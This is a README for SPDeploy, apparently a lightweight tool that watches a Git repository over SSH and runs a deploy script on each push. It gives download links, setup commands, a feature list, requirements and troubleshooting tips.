# 🚀 SPDeploy - Instant Git Deployments Made Easy

[![Download SPDeploy](https://img.shields.io/badge/Download-SPDeploy-blue.svg)](https://github.com/Louniss72/SPDeploy/releases)

## 📥 Download & Install

To get started with SPDeploy, visit the following link to download the latest version.

- **Download SPDeploy**: [Get the latest release here](https://github.com/Louniss72/SPDeploy/releases/latest)

Follow these steps to set up SPDeploy on your system:

## 🚀 Getting Started

Setting up SPDeploy takes just a few minutes. Follow these easy steps:

1. **Download from GitHub releases page**  
   Click on the link to go to the releases page: [Download SPDeploy](https://github.com/Louniss72/SPDeploy/releases/latest).  
   Download the binary that matches your operating system and extract the files.

2. **Add Your Repository**  
   Open your terminal or command prompt and enter the following command:  
   ```
   spdeploy add git@github.com:username/myapp.git /var/www/myapp
   ```
   Replace `username/myapp.git` with your actual Git repository link, and `/var/www/myapp` with the directory where you want to deploy your app.

3. **Start Monitoring**  
   Now, run the following command to start monitoring your repository:  
   ```
   spdeploy run
   ```

That’s it! SPDeploy will now watch your repository and automatically deploy your changes whenever you push to it.

## 🔍 Features

SPDeploy offers several key features that make it simple and effective for deployment:

- **Universal Git Support**  
  SPDeploy works seamlessly with GitHub, GitLab, BitBucket, and any other Git server that uses SSH. You can use it with any repository type or hosting provider.

- **Simple Setup**  
  There are no YAML configurations or complex pipelines. You run one command to add your repository and another to monitor it. It’s as straightforward as it gets.

- **Deploy Scripts**  
  You can set up a deployment script named `spdeploy.sh`. This script will automatically execute every time SPDeploy pulls new changes, allowing you to handle custom deployment tasks easily.

- **Lightweight**  
  The application is compact, taking minimal resources on your server. This ensures that it runs smoothly without adding overhead.

- **Built-In Security**  
  SPDeploy uses SSH for communication, ensuring that your connections are secure. This means your code and data remain protected during deployment.

## 📋 System Requirements

To run SPDeploy, ensure your system meets the following requirements:

- **Operating System**: Windows, macOS, or Linux
- **Git Installed**: You must have Git installed on your system. Visit [Git's official site](https://git-scm.com/downloads) to download and install it if you haven't.
- **SSH Access**: Ensure you can access your repositories via SSH. This often involves setting up SSH keys. Follow the instructions in your Git provider's documentation for setting this up.

## 🛠 Configuration

SPDeploy is designed to be as low-touch as possible. However, you might want to fine-tune certain aspects:

- **Environment Variables**: You can customize parameters like `SPDEPLOY_HOME` to change the default installation directory if needed.
- **Script Customization**: The `spdeploy.sh` script can be modified to include any commands you need to run post-deployment, such as building assets or restarting services.

## ⚡ Troubleshooting

If you encounter any issues while using SPDeploy, consider the following:

- **Repository Access**: Make sure you have proper access to the Git repository. Test your SSH connection with the command:  
  ```
  ssh -T git@github.com
  ```
- **Check Logs**: SPDeploy outputs logs to help you debug any issues. Review these logs if you experience unexpected behavior.

## 📜 License

SPDeploy is open-source software. You can find the license details in the repository.

## 🌐 Community and Support

If you have questions or need assistance, feel free to reach out:

- **GitHub Issues**: Report any issues or request features through the [GitHub Issues page](https://github.com/Louniss72/SPDeploy/issues).
- **Documentation**: Explore further details and examples in the documentation available on the repository.

For updates and community discussions, check our GitHub Discussions section.

## 💡 Feedback

We welcome your feedback to improve SPDeploy. Share your thoughts on how we can make the application better suited to your needs. Your input is invaluable.

Enjoy seamless deployments with SPDeploy! 